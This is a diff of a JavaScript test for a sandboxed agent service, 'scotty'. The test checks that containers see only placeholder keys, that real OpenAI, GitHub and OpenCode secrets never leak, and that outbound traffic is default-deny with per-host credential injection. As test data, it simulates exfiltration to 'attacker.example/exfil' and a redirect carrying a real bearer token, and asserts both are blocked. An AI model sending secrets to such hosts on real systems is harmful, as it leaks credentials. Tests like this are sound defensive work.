@@ -451,7 +451,7 @@ test("Pi terminal page is authenticated and sleeping sessions return to Home", a
   assert.equal(sleeping.headers.get("location"), "/sessions");
 });
 
-test("sentinels are visible, real credentials are absent, and egress is default-deny", async (t) => {
+test("placeholders are visible, real credentials are absent, and egress is default-deny", async (t) => {
   const service = await new FakeWorkerService().start();
   t.after(() => service.stop());
   const session = await create(service, "honeypot credential scan");
@@ -463,10 +463,10 @@ test("sentinels are visible, real credentials are absent, and egress is default-
   assert.equal(snapshot.status, 200);
 
   const surfaces = service.publicSurfaces(session.id);
-  assert.match(JSON.stringify(surfaces.container), new RegExp(`scotty-sentinel-${session.id}`));
-  assert.match(surfaces.container.env.OPENAI_API_KEY, new RegExp(`^scotty-sentinel-`));
-  assert.match(surfaces.container.env.OPENCODE_API_KEY, new RegExp(`^scotty-sentinel-`));
-  assert.match(surfaces.container.env.GH_TOKEN, new RegExp(`^scotty-sentinel-`));
+  assert.match(JSON.stringify(surfaces.container), /scotty-injected/u);
+  assert.equal(surfaces.container.env.OPENAI_API_KEY, "scotty-injected");
+  assert.equal(surfaces.container.env.OPENCODE_API_KEY, "scotty-injected");
+  assert.equal(surfaces.container.env.GH_TOKEN, "scotty-injected");
   assertNoLeaks(surfaces, [
     service.realOpenaiSecret,
     service.realGithubSecret,
@@ -477,20 +477,35 @@ test("sentinels are visible, real credentials are absent, and egress is default-
 
   const denied = service.attemptEgress(session.id, "https://attacker.example/exfil");
   assert.deepEqual(denied, { allowed: false, status: 403, authorization: null });
-  const allowed = service.attemptEgress(session.id, "https://api.openai.com/v1/responses");
-  assert.equal(allowed.allowed, true);
-  assert.equal(
-    allowed.authorization,
-    service.realOpenaiSecret,
-    "credential injection happens only outside container-visible state",
+  for (const [target, secret] of [
+    ["https://api.openai.com/v1/responses", service.realOpenaiSecret],
+    ["https://github.com/owner/project.git", service.realGithubSecret],
+    ["https://api.github.com/repos/owner/project", service.realGithubSecret],
+    ["https://codeload.github.com/owner/project/tar.gz/dev", service.realGithubSecret],
+    ["https://opencode.ai/zen/v1/responses", service.realOpencodeSecret],
+    ["https://pi.dev/models.json", service.realOpencodeSecret],
+  ]) {
+    const allowed = service.attemptEgress(session.id, target);
+    assert.equal(allowed.allowed, true, target);
+    assert.equal(
+      allowed.authorization,
+      secret,
+      `credential injection happens only outside container-visible state (${target})`,
+    );
+  }
+  const unauthenticated = service.attemptEgress(session.id, "https://pi.dev/models.json", "");
+  assert.equal(unauthenticated.allowed, true, "passthrough hosts allow requests without auth");
+  const passthrough = service.attemptEgress(
+    session.id,
+    "https://registry.npmjs.org/scotty",
+    "Bearer existing-credential",
   );
-  const opencodeEgress = service.attemptEgress(session.id, "https://opencode.ai/zen/v1/responses");
-  assert.equal(opencodeEgress.allowed, true);
-  assert.equal(opencodeEgress.authorization, service.realOpencodeSecret);
+  assert.equal(passthrough.allowed, true);
+  assert.equal(passthrough.authorization, null, "unmapped allowlisted hosts inject nothing");
   const redirected = service.attemptEgress(
     session.id,
     "https://attacker.example/redirect-target",
-    allowed.authorization,
+    `Bearer ${service.realOpenaiSecret}`,
   );
   assert.equal(
     redirected.allowed,
